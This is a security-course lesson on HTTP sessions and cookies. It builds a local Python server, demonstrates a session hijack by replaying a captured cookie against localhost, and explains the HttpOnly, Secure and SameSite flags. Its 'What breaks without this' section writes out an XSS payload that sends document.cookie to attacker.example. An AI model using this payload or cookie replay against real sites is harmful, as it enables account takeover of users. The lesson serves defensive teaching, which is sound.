# Lesson 14: Sessions and Cookies

Today we study the mechanism that lets a website remember you across many separate
requests, even though the protocol underneath has no memory of its own at all — and why
stealing that mechanism is, for an attacker, often strictly better than stealing a
password. Our case study is a 40-line HTTP server, a real login flow, and one line of code
that hands a stranger someone else's identity without ever touching their credentials.

## What you will learn

You'll build a real HTTP server that issues session cookies, watch a client use one to
stay "logged in" across separate requests, and then reproduce a session hijack — literally
copying a cookie value into a second, unrelated connection and watching it grant full
access. You'll finish knowing exactly what three specific cookie flags do and why each one
closes a door a previous lesson opened.

## What you need to know first

Lesson 3 (Authentication vs. Authorization): a session is how a system remembers *who you
authenticated as* between separate requests, without asking you to re-authenticate every
time. Lesson 6 (XSS) and Lesson 13 (MITM): this lesson names exactly what a cookie needs
to defend against both.

---

## The problem

HTTP is a **stateless** protocol: each request a browser sends is handled independently,
with no built-in memory connecting it to any earlier request from the same visitor. Log in
on one request, and the very next request — even one second later — arrives at the server
looking, by default, exactly as anonymous as the first one ever did. Every website that
keeps you logged in across multiple page views has to solve this problem itself, and the
standard solution is a **cookie**: a small piece of data the server asks the browser to
store, and which the browser then automatically attaches to every subsequent request to
that same site. A **session** is the server-side record that a specific cookie value
corresponds to a specific logged-in identity.

## The lab: issuing, using, and stealing a session

**Disposable host.** A minimal HTTP server with two endpoints: `/login` (issues a session)
and `/whoami` (reports who the current session belongs to, if anyone).

### Step 1 — a server that issues session cookies

```python
import http.server
import secrets

sessions = {}  # session_token -> username

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        cookie_header = self.headers.get("Cookie", "")
        session_token = None
        for piece in cookie_header.split(";"):
            piece = piece.strip()
            if piece.startswith("session="):
                session_token = piece.split("=", 1)[1]

        if self.path == "/login":
            session_token = secrets.token_hex(16)
            sessions[session_token] = "ada"
            self.send_response(200)
            self.send_header("Set-Cookie", f"session={session_token}")
            self.end_headers()
            self.wfile.write(b"logged in, session cookie issued")
            return

        if self.path == "/whoami":
            username = sessions.get(session_token)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(
                f"you are: {username}".encode() if username else b"not logged in"
            )
            return

if __name__ == "__main__":
    http.server.HTTPServer(("127.0.0.1", 8080), Handler).serve_forever()
```

**New constructs.** `http.server.BaseHTTPRequestHandler` is Python's standard-library base
class for handling one HTTP request; subclassing it and defining `do_GET` gives you a
method called automatically for every incoming `GET` request. `self.headers.get("Cookie")`
reads whatever the browser sent in its `Cookie` request header — a semicolon-separated
list of `name=value` pairs the browser is required to attach automatically, once a cookie
has been set, to every request to the matching site. `secrets.token_hex(16)` generates a
cryptographically random 32-character hex string — this is Lesson 10's "cryptographically
secure randomness" requirement applied to session tokens: a predictable token would let an
attacker simply guess valid sessions. `self.send_header("Set-Cookie", "session=...")`
tells the browser, via the response, to store this cookie and attach it to future requests
to this server automatically.

Run the server, then, from a separate script, act as a client:

```python
import http.client

connection = http.client.HTTPConnection("127.0.0.1", 8080)
connection.request("GET", "/login")
response = connection.getresponse()
set_cookie = response.getheader("Set-Cookie")
print("Set-Cookie header received:", set_cookie)
session_cookie = set_cookie.split(";")[0]
connection.close()

connection = http.client.HTTPConnection("127.0.0.1", 8080)
connection.request("GET", "/whoami", headers={"Cookie": session_cookie})
print("With cookie:", connection.getresponse().read())
connection.close()

connection = http.client.HTTPConnection("127.0.0.1", 8080)
connection.request("GET", "/whoami")
print("Without cookie:", connection.getresponse().read())
connection.close()
```

Run it:

```
Set-Cookie header received: session=5178f07cebb23680f782946a90bf60f2
With cookie: b'you are: ada'
Without cookie: b'not logged in'
```

**Walkthrough.** `/login` never asked for a password in this simplified lab — in a real
system, this endpoint would check credentials (Lesson 10's hashed comparison) before
reaching the line that issues a session token. What matters here is what happens *after*:
the server hands back a random token and remembers, in its own `sessions` dictionary, that
this specific token belongs to `"ada"`. The client's second request carries that token
back in a `Cookie` header, and the server looks it up — no username or password
transmitted again, just the token standing in for "the same person who logged in a moment
ago." The third request, with no cookie at all, is correctly treated as anonymous.

**CS lens.** `sessions` is functioning exactly like Lesson 3's `logged_in_sessions` — a
lookup table mapping an opaque token to an identity — because this *is* that same
mechanism, spelled out with a real HTTP server underneath it instead of a bare Python
dictionary standing in for "somehow logged in."

### Step 2 — stealing the cookie is stealing the identity

```python
connection = http.client.HTTPConnection("127.0.0.1", 8080)
connection.request("GET", "/whoami", headers={"Cookie": session_cookie})
print("Attacker's connection, using the SAME cookie value:", connection.getresponse().read())
connection.close()
```

Run it, using the exact `session_cookie` value captured in Step 1 — but from a completely
separate `http.client.HTTPConnection`, standing in for a different browser, a different
machine, anyone at all who obtained that string:

```
Attacker's connection, using the SAME cookie value: b'you are: ada'
```

**Walkthrough.** This connection never touched Ada's password, never called `/login`,
never proved anything about its identity except possessing one specific 32-character
string. The server has no way to distinguish this request from Ada's own — by design,
that's exactly what a session token is *for*: proving "I am the same party who logged in
earlier" without re-proving identity from scratch every time. That design is precisely
what makes a stolen session token so dangerous: it isn't a weaker form of credential than a
password, it's a **fully equivalent one**, valid for as long as the session lasts, with no
further authentication check standing in the way.

**Security lens.** This is why Lesson 6's XSS lesson emphasized `document.cookie` as a
realistic attack payload target, and why Lesson 13's plaintext HTTP scenario is dangerous
even for websites that don't transmit passwords on every page: **a stolen session cookie
grants everything a stolen password would, without the attacker ever needing to know or
guess the password at all.** An attacker who can read a cookie — via XSS, via an
unencrypted connection, via a poorly secured backup or log file that happened to record
request headers — has, functionally, logged in as the victim.

---

## Three flags that close three specific doors

A real `Set-Cookie` header carries more than just a name and value. Three attributes each
close one specific attack this course has already shown you in full:

```
Set-Cookie: session=5178f07c...; HttpOnly; Secure; SameSite=Strict
```

- **`HttpOnly`** — tells the browser: this cookie must never be exposed to JavaScript
  running on the page at all; `document.cookie` simply will not include it, no matter what
  script asks. This is a direct, named defense against Lesson 6's XSS: even if an attacker
  successfully injects a script into the page — the exact `<img src=x onerror=...>` attack
  from that lesson — a properly flagged session cookie is invisible to that script and
  cannot be exfiltrated by it. Without `HttpOnly`, Lesson 6's payload could simply read
  `document.cookie` and send it to an attacker-controlled server, upgrading "I can run
  JavaScript on this page" into "I can log in as this user."
- **`Secure`** — tells the browser: never send this cookie over a plain, unencrypted `http://`
  connection, only over `https://`. This is a direct, named defense against Lesson 13's
  positioned attacker: without `Secure`, a session cookie is transmitted in the clear the
  moment a user's browser makes even one accidental plain-HTTP request to the site (a
  stray link, a redirect misconfiguration), and Lesson 13's proxy — or anyone else
  positioned on the network — reads it exactly as trivially as it read the plaintext
  balance in that lesson's Step 1.
- **`SameSite`** — controls whether this cookie is attached to requests originating from a
  *different* website than the one that set it. `SameSite=Strict` means: never send this
  cookie on a cross-site request, full stop. This is the specific defense Lesson 15
  (CSRF) is built entirely around — a malicious site trying to trigger a request to your
  bank on your behalf relies on your browser attaching your bank's session cookie
  automatically; `SameSite` is the flag that refuses to attach it in exactly that
  situation.

**SE lens.** Each of these flags exists because a cookie, once issued, is used in contexts
its issuer doesn't fully control — read by whatever JavaScript happens to be running on
the page, sent over whatever connection the browser happens to be using, attached to
whatever request the browser happens to be making. Each flag narrows that scope back down
to exactly what's needed: available only to the server (`HttpOnly`), only over encrypted
connections (`Secure`), only for requests genuinely originating from the same site
(`SameSite`).

---

## Connect the pieces

Step 1 and Step 2 rebuilt Lesson 3's authentication/authorization mechanism as a real,
runnable HTTP session — and Step 2's hijack demonstration is the mechanical reason Lesson
6's XSS and Lesson 13's MITM both listed "steal the session cookie" as their most direct
path to full account compromise, rather than something more elaborate. The three flags
above are this lesson's payoff for having sat through those two: each is a one-line,
named, specific answer to an attack you've already built with your own hands.

## What breaks without this

Take Step 1's server exactly as written — no `HttpOnly`, no `Secure`, no `SameSite` — and
place it behind a page with even one unfixed XSS vulnerability from Lesson 6:

```javascript
'<img src="x" onerror="fetch(\'https://attacker.example/steal?c=\' + document.cookie)">'
```

Because the session cookie carries none of today's three flags, this payload — identical
to Lesson 6's, changed only to target `document.cookie` instead of `document.title` —
successfully exfiltrates the exact token Step 2 showed you is fully sufficient to
impersonate Ada. No password was guessed, cracked, or intercepted. The entire attack chain
runs through a cookie that today's three flags, correctly set, would have stopped at two
separate points.

## Recognition

```
Today: Sessions, Cookies, and the HttpOnly/Secure/SameSite Flags

Also recognized in: every "remember me" checkbox (a longer-lived cookie, the same
mechanism with a longer expiration), OAuth and single sign-on flows (which
ultimately still rely on a session cookie once the initial login exchange
completes), session fixation attacks (tricking a victim into using an
attacker-chosen session token before they log in, so the attacker already knows
the token that becomes valid the moment they authenticate), "log out of all
devices" features (which work by invalidating every session token associated with
an account server-side, exactly like removing an entry from this lesson's
`sessions` dictionary), and JWT-based "stateless" session schemes, which move the
session data into the token itself but face the identical theft risk this lesson
demonstrated, and need the identical flags to mitigate it.
```

## Definition of done

- [ ] You ran Step 1 and reproduced the login, with-cookie, and without-cookie outputs
- [ ] You ran Step 2 and reproduced the hijack — a second, unrelated connection using the
      captured cookie value successfully impersonating Ada
- [ ] You can state, from memory, which specific attack from an earlier lesson each of
      `HttpOnly`, `Secure`, and `SameSite` defends against
- [ ] You can explain, in one sentence, why a stolen session cookie is not a "lesser"
      compromise than a stolen password
- [ ] `git add .` and `git commit -m "Lesson 14: sessions, cookies, and session
      hijacking"` in your `security-labs/` folder

**Next:** Lesson 15 — CSRF, where you'll see exactly how a malicious website can trigger a
request to your bank using your own browser and your own valid session cookie, without
ever being able to read that cookie itself — and why `SameSite` alone is closing a gap
`HttpOnly` was never designed to.
